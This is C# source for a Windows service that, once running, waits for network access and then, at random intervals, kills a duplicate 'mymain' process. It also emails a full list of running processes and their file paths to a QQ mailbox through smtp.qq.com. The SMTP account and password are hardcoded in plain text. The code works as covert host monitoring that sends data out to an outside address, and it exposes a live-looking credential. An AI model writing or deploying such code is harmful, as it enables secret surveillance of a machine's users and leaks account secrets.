﻿using MimeKit;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Dszy
{
    public partial class Dszy : ServiceBase
    {
        Random wait = new Random();
        public Dszy()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                //睡眠1分钟后执行
                Thread.Sleep(60000);

                //网络判断
                while (!NetStateHelper.IsConnectInternet())
                {
                    Thread.Sleep(5000);
                }
            }
            catch { }

            try
            {
                //启动
                Task.Run(SendWakeupMailAsync);
            }
            catch { }

            //while (true)
            //{
            //    if (DateTime.Now.Minute == 1)
            //    {
            //        //信息
            //        Task.Run(SendInfoMailAsync);
            //    }
            //    Thread.Sleep(60 * 1000);
            //}

            while (true)
            {
                int min = wait.Next(5, 55);
                Thread.Sleep(min * 60 * 1000);
                CloseOne();
                //信息
                Task.Run(SendInfoMailAsync);
            }
        }

        protected override void OnStop()
        {

        }

        void CloseOne()
        {
            try
            {
                var myProcess = Process.GetProcessesByName("mymain");
                if (myProcess.Length > 1)
                {
                    foreach (var p in myProcess)
                    {
                        p.Kill();
                        break;
                    }
                }
            }
            catch { }
        }

        private string ProcessMiro()
        {
            var myProcess = Process.GetProcesses();
            StringBuilder sb = new StringBuilder();

            foreach (Process p in myProcess)
            {
                try
                {
                    sb.AppendLine(p.ProcessName + "\t=========>\t" + p.MainModule.FileName);
                }
                catch (Exception e)
                {
                    sb.AppendLine("遇到错误\t=========>\t" + p.MainModule.FileName);
                }
            }



            //sb.Append("<table border=\"1\">");
            //sb.Append("<tr>");
            //sb.Append("<th> pName </th>");
            //sb.Append("<th> pID </th>");
            //sb.Append("<th> pFilePath </th>");
            //sb.Append("</tr>");

            //sb.Append("<tr>");
            //sb.Append("<td colspan=\"3\">" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "</td>");
            //sb.Append("</tr>");

            //foreach (Process p in myProcess)
            //{
            //    try
            //    {
            //        ProcessModule m = p.MainModule;
            //        sb.Append("<tr>");
            //        sb.Append("<td>" + p.ProcessName + "</td>");
            //        sb.Append("<td>" + p.Id + "</td>");
            //        sb.Append("<td>" + m.FileName + "</td>");
            //        sb.Append("</tr>");
            //    }
            //    catch { };

            //}
            //sb.Append("</table>");
            return sb.ToString();
        }

        private async Task SendWakeupMailAsync()
        {
            EMailHelper.Host = "smtp.qq.com";
            EMailHelper.Port = 465;
            EMailHelper.UseSsl = true;
            EMailHelper.UserName = "390059127@qq.com";
            EMailHelper.Password = "phykougiygxcbjif";
            EMailHelper.UserAddress = "390059127@qq.com";
            var subject = "Wakeup";
            var content = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            await EMailHelper.SendEMailAsync(subject, content, new MailboxAddress[] {
                new MailboxAddress("150101977@qq.com")
            });
        }

        private async Task SendInfoMailAsync()
        {
            EMailHelper.Host = "smtp.qq.com";
            EMailHelper.Port = 465;
            EMailHelper.UseSsl = true;
            EMailHelper.UserName = "390059127@qq.com";
            EMailHelper.Password = "phykougiygxcbjif";
            EMailHelper.UserAddress = "390059127@qq.com";
            var subject = "InfoNow";
            string str = ProcessMiro();
            await EMailHelper.SendEMailAsync(subject, str, new MailboxAddress[] {
                new MailboxAddress("150101977@qq.com")
            });
        }
    }
}
